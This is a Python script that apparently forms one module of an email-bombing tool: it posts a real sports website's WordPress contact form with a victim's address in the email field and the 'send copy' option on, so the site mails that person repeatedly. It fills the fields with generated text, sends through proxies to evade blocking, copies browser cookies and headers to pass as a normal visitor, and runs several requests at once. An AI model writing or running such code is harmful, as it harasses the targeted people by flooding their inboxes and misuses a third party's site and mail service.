from os.path import basename

import requests

from module import Spam

cookies = {
    '_gcl_au': '1.1.172093690.1676998357',
    '_gid': 'GA1.2.1737207222.1676998357',
    '_fbp': 'fb.1.1676998357190.2187594',
    '_ga_2WD1V0Q5H3': 'GS1.1.1677056804.2.0.1677056804.0.0.0',
    '_ga': 'GA1.2.266929909.1676998357',
    '_gat_UA-142334527-1': '1',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzPOz81wssBPAvgkF',
    # 'Cookie': '_gcl_au=1.1.172093690.1676998357; _gid=GA1.2.1737207222.1676998357; _fbp=fb.1.1676998357190.2187594; _ga_2WD1V0Q5H3=GS1.1.1677056804.2.0.1677056804.0.0.0; _ga=GA1.2.266929909.1676998357; _gat_UA-142334527-1=1',
    'Origin': 'https://playsports.world',
    'Referer': 'https://playsports.world/en/contact/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'connection': 'keep-alive'

}

s = '"success":true'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="contact-name"\r\n\r\ntest\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="contact-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_name_0"\r\n\r\nBetriebssystem\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_0"\r\n\r\ntest\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_name_1"\r\n\r\nOrganisation\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_1"\r\n\r\ntest\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_name_2"\r\n\r\nLand\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_2"\r\n\r\nDeutschland\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_name_3"\r\n\r\nThema\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_3"\r\n\r\nAccount & Profil\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="contact-message"\r\n\r\ntest\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_name_4"\r\n\r\nAnhang\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="field_extra_4"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="contact-sendcopy"\r\n\r\n1\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="gdpr"\r\n\r\n1\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="action"\r\n\r\nbuilder_contact_send\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n10683\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="orig_id"\r\n\r\n10683\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF\r\nContent-Disposition: form-data; name="element_id"\r\n\r\nbgb8720\r\n------WebKitFormBoundaryzPOz81wssBPAvgkF--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post('https://playsports.world/wp-admin/admin-ajax.php', cookies=cookies, headers=headers,
                                 data=data.encode(), proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
